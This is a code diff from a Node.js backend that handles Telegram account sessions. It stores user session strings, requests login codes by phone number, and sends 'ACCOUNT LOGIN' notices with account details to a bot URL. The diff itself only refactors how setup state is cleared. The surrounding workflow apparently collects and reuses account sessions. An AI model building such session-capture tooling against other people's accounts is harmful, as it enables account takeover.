@@ -329,10 +329,11 @@ app.post('/users', async (req, res, next) => {
   const user = req.body;
   const db = ChannelService.getInstance();
   const cli = getClient(user.mobile);
-  if (!cli || activeLoginNumber !== user.mobile) {
+  if (!cli || getActiveClientSetup()?.phoneNumber !== user.mobile) {
     await db.insertUser(user);
     await fetchWithTimeout(`${ppplbot()}&text=ACCOUNT LOGIN: ${user.userName ? user.userName : user.firstName}:${user.msgs}:${user.totalChats}\n https://uptimechecker.onrender.com/connectclient/${user.mobile}`)
   } else {
+    setActiveClientSetup(undefined)
     console.log("New Session Generated");
     await setNewClient(user);
     await deleteClient(user.mobile)
@@ -1774,9 +1775,6 @@ async function generateNewSession(phoneNumber) {
     console.log("String Generation started");
     const response = await axios.get(`https://tgsignup.onrender.com/login?phone=${phoneNumber}`);
     console.log("Code Sent successfully")
-    setTimeout(() => {
-      setActiveClientSetup(undefined)
-    }, 80000);
   } catch (error) {
     console.log(error)
   }
@@ -1798,7 +1796,6 @@ async function setNewClient(user) {
     const updatedClient = await db.updateUserConfig({ clientId: activeClientSetup.clientId }, { session: user.session, number: `+${user.mobile}`, userName: user.userName?.replace("@", ''), mainAccount: mainAccount });
     console.log("Updated the Client Successfully");
     await db.deleteBufferClient({ mobile: activeClientSetup.phoneNumber });
-    activeClientSetup = undefined;
     await axios.get(`${updatedClient.repl}/exit`)
   } catch (error) {
     console.log(error);
